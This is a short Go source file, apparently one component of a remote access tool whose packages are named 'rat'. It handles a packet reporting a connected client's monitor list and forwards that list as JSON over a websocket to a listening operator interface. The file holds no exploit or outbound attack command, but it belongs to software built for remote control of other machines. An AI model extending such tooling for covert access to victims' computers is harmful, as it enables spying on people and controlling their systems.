package main

import (
	"fmt"
	"rat/shared"
	"rat/shared/network/header"

	"encoding/json"

	"golang.org/x/net/websocket"
)

type MonitorsPacket struct {
	Monitors []shared.Monitor `network:"receive"`
}

func (packet MonitorsPacket) Header() header.PacketHeader {
	return header.MonitorsHeader
}

func (packet MonitorsPacket) Init(c *Client) {

}

func (packet MonitorsPacket) OnReceive(c *Client) error {
	c.Monitors = packet.Monitors

	if ws, ok := c.Listeners[header.MonitorsHeader]; ok {
		json, err := json.Marshal(&c.Monitors)

		if err != nil {
			fmt.Println("json:", err)
		}

		event := newEvent(MonitorQueryEvent, c.Id, string(json))

		err = websocket.JSON.Send(ws, &event)

		if err != nil {
			return err
		}
	}

	fmt.Println("Monitors", c.Monitors)

	delete(c.Listeners, header.MonitorsHeader)

	return nil
}
